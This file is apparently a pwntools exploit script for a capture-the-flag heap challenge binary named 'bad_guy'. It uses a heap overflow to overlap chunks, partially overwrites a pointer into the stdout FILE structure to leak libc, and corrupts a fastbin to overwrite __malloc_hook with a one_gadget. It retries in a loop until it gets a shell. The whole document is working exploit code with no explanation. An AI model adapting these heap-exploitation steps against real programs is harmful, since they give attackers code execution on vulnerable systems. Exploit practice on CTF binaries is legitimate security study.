from pwn import *

context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

elf = ELF('./data/bin/heap23_45_npuctf_2020_bad_guy')
libc = elf.libc

menu = '>> '

def add(index, size, content):
    r.sendlineafter(menu, '1')
    r.sendlineafter('Index :', str(index))
    r.sendlineafter('size: ', str(size))
    r.sendafter('Content:', content)

def edit(index, size, content):
    r.sendlineafter(menu, '2')
    r.sendlineafter('Index :', str(index))
    r.sendlineafter('size: ', str(size))
    r.sendafter('content: ', content)

def delete(index):
    r.sendlineafter(menu, '3')
    r.sendlineafter('Index :', str(index))

def attack():
    add(0, 0x10, 'aaaa')
    add(1, 0x10, 'aaaa')
    add(2, 0x60, 'bbbb')
    add(3, 0x10, 'ccc')

    delete(2)

    p1 = p64(0) * 3 + p64(0x91)
    edit(0, len(p1), p1)

    delete(1)

    add(4, 0x10, 'aaa')

    p2 = p64(0) * 3 + p64(0x71) + b'\xdd\x25'
    edit(4, len(p2), p2)

    add(5, 0x60, 'aaaa')

    p3 = b'a' * 3 + p64(0) * 6 + p64(0xfbad1880) + p64(0) * 3 + b'\x00'

    add(6, 0x60, p3)


    libc_base = u64(r.recvuntil('\x7f')[-6:].ljust(8, b'\x00')) - 192 - libc.sym['_IO_2_1_stderr_']
    success('libc_base = ' + hex(libc_base))
    malloc_hook = libc_base + libc.sym['__malloc_hook']
    success('malloc_hook = ' + hex(malloc_hook))

    one = [0x45216, 0x4526a, 0xf02a4, 0xf1247]
    one_gadget = one[3] + libc_base

    add(7, 0x60, 'aaa')

    delete(7)

    p4 = p64(0) * 3 + p64(0x71) + p64(malloc_hook - 0x23)
    edit(4, len(p4), p4)

    add(8, 0x60, 'aaa')

    p5 = b'a' * 0x13 + p64(one_gadget)
    add(9, 0x60, p5)

    r.sendlineafter(">> ", "1")
    r.sendlineafter("Index :", str(10))
    r.sendlineafter("size: ", str(0x10))

    r.interactive()

while True:
    try:
        r = process('./data/bin/heap23_45_npuctf_2020_bad_guy')
        attack()
        break
    except:
        r.close()
        continue